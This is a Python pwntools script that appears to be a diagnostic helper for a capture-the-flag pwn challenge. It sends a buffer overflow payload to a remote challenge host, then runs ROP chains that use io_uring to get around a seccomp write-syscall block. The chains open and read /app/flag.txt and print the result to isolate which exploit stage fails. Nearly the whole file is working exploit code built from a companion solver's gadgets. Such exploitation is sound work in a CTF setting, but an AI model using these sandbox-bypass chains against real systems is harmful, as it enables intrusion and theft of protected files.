#!/usr/bin/env python3
"""Remote failure isolator for elite_ball_knowledge.

Local PASS but remote 'no flag' -> figure out WHICH stage breaks on the server.
Three independent probes against the real host, each blind-exfils via io_uring
(the only allowed write channel, since every write-family syscall is nr<335 = blocked):

  A. io_uring write a FIXED marker to stdout (no file touched).
        marker shows  -> io_uring works remote + ring offsets correct.
        marker absent -> io_uring disabled in jail OR ring offsets differ OR ROP dead.
  B. full ORW of /app/flag.txt  (the real exploit).
  C. full ORW but write the OPENED fd number back, to check openat2 succeeded
     and which fd it got (jail may have extra fds open -> not 3).

Run:  uv run python diag_remote.py [host] [port]
"""
import os
import re
import sys

from pwn import context, remote

context.arch = "amd64"
context.log_level = "warn"

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import solve as S  # reuse all gadgets / helpers / constants

HOST = sys.argv[1] if len(sys.argv) > 1 else "elijah-balls.chal.zip"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 32267

MARKER = b"REMOTE_IOURING_OK"  # no 0x0a byte -> safe through fgets


def iouring_write(addr, length, fd=1):
    """Submit one OP_WRITE sqe (fd, addr, length) and enter."""
    c = S.setmem64(S.PARAMS + S.P_FLAGS, S.IORING_SETUP_NO_MMAP)
    c += S.setmem64(S.PARAMS + S.P_CQ_USER, S.RINGS)
    c += S.setmem64(S.PARAMS + S.P_SQ_USER, S.SQES)
    c += S.wsyscall(S.SYS_IO_URING_SETUP, 8, S.PARAMS, 0, 0)
    c += S.build_sqe(S.IORING_OP_WRITE, fd, addr, length, 0, 0x2222)
    c += S.setmem64(S.RINGS + S.SQ_ARRAY_OFF, 0)
    c += S.setmem64(S.RINGS + 0, (1 << 32) | 0)  # head=0 tail=1
    c += S.wsyscall(S.SYS_IO_URING_ENTER, S.EXPECTED_RING_FD, 1, 1, S.IORING_ENTER_GETEVENTS)
    return c


def chain_A():
    """io_uring writes a fixed marker to stdout. No file. Isolates io_uring itself."""
    c = S.writebytes(S.FILEBUF, MARKER)
    c += iouring_write(S.FILEBUF, len(MARKER), fd=1)
    c += S.wsyscall(231, 0)
    return c


def chain_C():
    """openat2 the flag, then io_uring-write the raw 8-byte fd value to stdout.
    Lets us see if open succeeded and which fd it returned (expected 3)."""
    c = S.writebytes(S.PATH, b"/app/flag.txt\x00")
    # openat2 -> rax = fd. Stash rax into FDSLOT via a mem-write gadget chain:
    #   we cannot read rax directly with our gadgets, so instead we rely on the
    #   real chain's fd assumption. Skip C if too fragile; B already covers it.
    c += S.wsyscall(S.SYS_OPENAT2, S.AT_FDCWD, S.PATH, S.HOW, 24)
    # write the 16 bytes at PATH back (proves io_uring + that we reached here)
    c += iouring_write(S.PATH, 16, fd=1)
    c += S.wsyscall(231, 0)
    return c


def shoot(tag, chain):
    payload = b"A" * S.OFF + chain
    assert b"\n" not in payload, f"[{tag}] payload has newline"
    try:
        io = remote(HOST, PORT, timeout=8)
    except Exception as ex:
        print(f"[{tag}] CONNECT FAILED: {ex}")
        return b""
    io.sendline(payload)
    data = io.recvall(timeout=12) or b""
    try:
        io.close()
    except Exception:
        pass
    printable = data[:120]
    print(f"[{tag}] recv {len(data)}B  raw={printable!r}")
    return data


def main():
    print(f"=== target {HOST}:{PORT} ===")
    print(f"=== solve.py thinks HOST={S.HOST!r}  (mismatch = bug #1) ===\n")

    a = shoot("A io_uring-marker", chain_A())
    a_ok = MARKER in a

    c = shoot("C open+echo-path", chain_C())

    b = shoot("B full-ORW-flag", S.build_chain(b"/app/flag.txt"))
    m = re.search(rb"grey\{[^}]*\}", b)

    print("\n--- verdict ---")
    print(f"A io_uring usable remote : {a_ok}")
    print(f"C reached-post-open      : {(b'/app/flag.txt' in c) or bool(c)}")
    print(f"B flag                   : {m.group(0).decode() if m else None}")
    if not a_ok:
        print(">> io_uring itself fails on remote (jail disables io_uring, or ring "
              "offsets/kernel differ, or ROP not executing). This is the blocker.")
    elif not m:
        print(">> io_uring OK but file read fails: check fd (not 3?), flag path, or "
              "OP_READ sqe. open-stage problem, not io_uring.")
    else:
        print(">> would have worked; original failure was likely the wrong HOST in solve.py.")


if __name__ == "__main__":
    main()
